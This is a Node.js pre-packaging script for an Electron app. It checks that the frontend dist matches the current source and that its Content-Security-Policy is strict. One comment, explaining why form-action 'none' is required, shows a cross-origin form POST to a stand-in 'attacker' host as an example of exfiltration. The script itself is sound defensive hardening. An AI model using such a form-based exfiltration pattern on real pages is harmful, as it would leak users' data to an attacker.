#!/usr/bin/env node
/**
 * verify-dist.mjs —— 校验 frontend/dist 是否与当前 src 同步（防陈旧构建产物）。
 *
 * 背景（build-consistency）：
 *   打包链路 electron-builder 直接把 frontend/dist/** 打进安装包，main.js 打包模式加载
 *   frontend/dist/index.html。若改了 src 却忘记重新 build，旧 bundle 仍会被打包，
 *   导致「IPC 链 / 重试逻辑 / 页面修正」等源码头最新改动在安装包中缺失。
 *   本脚本用与生产一致的构建重建到临时目录，比对产物 hash：
 *     一致 → 通过（退出码 0）；不一致或 dist 缺失 → 非零退出，阻止打包。
 *
 * 用法（打包前调用，见 frontend/package.json 的 verify:dist、electron/package.json 的 pack/dist）：
 *   cd frontend && node scripts/verify-dist.mjs
 */

import { execSync } from 'node:child_process';
import { readFileSync, rmSync } from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const frontendRoot = path.join(__dirname, '..');
const checkOutDir = path.join(frontendRoot, '.dist-check');

/** 从 index.html 提取引用的 hashed bundle 名（assets/index-<hash>.js）。 */
function extractBundleName(indexHtmlPath) {
  const html = readFileSync(indexHtmlPath, 'utf-8');
  const m = html.match(/assets\/index-([A-Za-z0-9_-]+)\.js/);
  return m ? m[1] : null;
}

/**
 * 校验打包产物 CSP 已收紧为生产严格版（csp-xss-defense）：
 *   - script-src 必须为 'self' 且不含 'unsafe-inline' / 'unsafe-eval'（无内联许可）；
 *   - connect-src 必须收窄到具体后端端口（http://127.0.0.1:<port>），拒绝裸 http://127.0.0.1
 *     放行任意本地端口（渲染进程被攻破时可触达本机任意服务）。
 * 任一不满足即 throw，阻止陈旧/宽松 CSP 产物被打进安装包（strictCspBuild 失效兜底）。
 */
function verifyStrictCsp(indexHtmlPath, label) {
  const html = readFileSync(indexHtmlPath, 'utf-8');
  const m = html.match(/content="(default-src [^"]*)"/);
  if (!m) {
    throw new Error(`[verify-dist] ${label}：未找到 CSP meta，拒绝以无 CSP / 宽松 CSP 打包。`);
  }
  const csp = m[1];
  const scriptSrc = (csp.match(/script-src [^;]*/) || [''])[0];
  // 硬编码断言：产物 script-src 必须精确等于 "script-src 'self'"（无内联/eval/nonce/hash 等任何
  // 额外 token），strictCspBuild 重写链一旦回退，任何残留内联许可都会被此精确比对拦下。
  if (scriptSrc.trim() !== "script-src 'self'") {
    throw new Error(
      `[verify-dist] ${label}：script-src 必须精确为 "script-src 'self'"（实际：${scriptSrc || '(缺失)'}），拒绝打包。`
    );
  }
  const connectSrc = (csp.match(/connect-src [^;]*/) || [''])[0];
  if (!/^connect-src http:\/\/127\.0\.0\.1:\d+$/.test(connectSrc)) {
    throw new Error(
      `[verify-dist] ${label}：connect-src 未收紧到具体后端端口（${connectSrc || '(缺失)'}），拒绝打包。`
    );
  }
  // form-action 必须为 'none'：form-action 不受 default-src / connect-src 管辖，缺失时跨源
  // <form method=POST action=https://attacker> 可外发数据（csp-xss-defense / csp-hardening）。
  const formAction = (csp.match(/form-action [^;]*/) || [''])[0];
  if (formAction.trim() !== "form-action 'none'") {
    throw new Error(
      `[verify-dist] ${label}：CSP 缺失 form-action 'none'（${formAction || '(缺失)'}），拒绝打包。`
    );
  }
  console.log(
    `[verify-dist] ${label} CSP OK（${scriptSrc.trim()} / ${connectSrc.trim()} / ${formAction.trim()}）。`
  );
}

let failed = false;
try {
  // 0) 打包前校验当前 dist 的 CSP 已收紧（严格版 script-src 'self' / connect-src 具体端口），
  //    防止陈旧或宽松 CSP 产物被打进安装包（strictCspBuild 失效兜底）。
  verifyStrictCsp(path.join(frontendRoot, 'dist', 'index.html'), '当前 dist');

  // 1) 用与 npm run build（tsc + vite build）一致的方式重建到临时目录
  console.log('[verify-dist] 重建校验产物（tsc --noEmit + vite build -> .dist-check）...');
  execSync('node node_modules/typescript/bin/tsc --noEmit', {
    cwd: frontendRoot,
    stdio: 'inherit',
  });
  execSync('node node_modules/vite/bin/vite.js build --outDir .dist-check --emptyOutDir', {
    cwd: frontendRoot,
    stdio: 'inherit',
  });

  // 1.5) 重建产物同样必须满足严格 CSP（strictCspBuild 断言在构建期失效时的最后防线）
  verifyStrictCsp(path.join(checkOutDir, 'index.html'), '重建产物');

  // 2) 对比：临时构建产物 hash vs 当前 dist/index.html 引用的 hash
  const freshHash = extractBundleName(path.join(checkOutDir, 'index.html'));
  let currentHash = null;
  try {
    currentHash = extractBundleName(path.join(frontendRoot, 'dist', 'index.html'));
  } catch (_err) {
    currentHash = null;
  }

  if (!freshHash) {
    console.error('[verify-dist] 无法解析重建产物的 hash 文件名，校验失败。');
    failed = true;
  } else if (!currentHash) {
    console.error(
      '[verify-dist] 当前 dist/index.html 缺失或无法解析 —— 前端尚未构建过。请先执行 cd frontend && npm run build。'
    );
    failed = true;
  } else if (freshHash !== currentHash) {
    console.error('[verify-dist] dist 与源码不同步（陈旧构建产物）！');
    console.error(`  当前 dist 引用:   assets/index-${currentHash}.js`);
    console.error(`  最新源码构建:     assets/index-${freshHash}.js`);
    console.error('  请执行 cd frontend && npm run build 后重新打包，禁止把陈旧 dist 打进安装包。');
    failed = true;
  } else {
    console.log(`[verify-dist] OK：dist 与源码同步（index-${currentHash}.js）。`);
  }
} catch (err) {
  console.error(
    '[verify-dist] 校验失败：',
    err && err.message ? err.message : String(err)
  );
  failed = true;
} finally {
  // 3) 清理临时目录
  try {
    rmSync(checkOutDir, { recursive: true, force: true });
  } catch (_err) {
    // 清理失败不影响校验结果
  }
}

process.exit(failed ? 1 : 0);
